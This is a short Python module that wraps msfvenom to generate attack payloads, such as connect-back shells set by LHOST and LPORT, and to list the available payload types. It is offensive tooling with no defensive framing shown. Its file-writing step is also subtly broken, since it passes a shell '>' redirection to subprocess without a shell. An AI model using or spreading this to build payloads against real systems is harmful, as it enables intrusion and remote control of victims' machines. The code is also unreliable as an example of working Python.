import subprocess
import shlex

def generate_payload(payload_type, payload_format, lhost, lport, file_name):
    cmd = f"msfvenom -p {payload_type} LHOST={lhost} LPORT={lport} -f {payload_format} > {file_name}.{payload_format}"
    subprocess.call(shlex.split(cmd))
    return f"{file_name}.{payload_format}"

def list_payloads():
    cmd = "msfvenom -l payloads"
    output = subprocess.check_output(shlex.split(cmd)).decode()
    return output
